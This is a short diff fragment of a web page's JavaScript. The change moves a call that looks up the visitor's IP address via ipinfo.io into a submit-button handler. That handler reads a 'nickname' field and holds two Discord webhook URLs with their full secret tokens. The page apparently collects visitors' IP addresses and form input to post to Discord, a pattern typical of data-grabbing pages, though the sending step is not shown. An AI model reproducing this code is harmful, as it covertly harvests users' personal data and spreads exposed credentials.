@@ -34,11 +34,11 @@
     "text/javascript">
     </script>
     <script>
-    $.get("http://ipinfo.io", function(response) {ip = response.ip; }, "jsonp");
     </script>
     <script>
     $(function() {
         $('#submit').click(function(e) {
+          $.get("http://ipinfo.io", function(response) {ip = response.ip; }, "jsonp");
         var url = 'https://discordapp.com/api/webhooks/645708018956238879/yKhJeFVHlXzOXZFQj4KifWdIinHQE01jNTkoC0UrPW2333eRqLa_29MADKzQtCXk4avf'
         var url2 = 'https://discordapp.com/api/webhooks/648772740471324672/g8a4ZekoGo6wk-KcfMuEymtxlsZxi0x2mYIhG4cWOk9HwbpS1KTh4jKfKN0v9OPYWxY7'
         var name = $("#nickname").val();
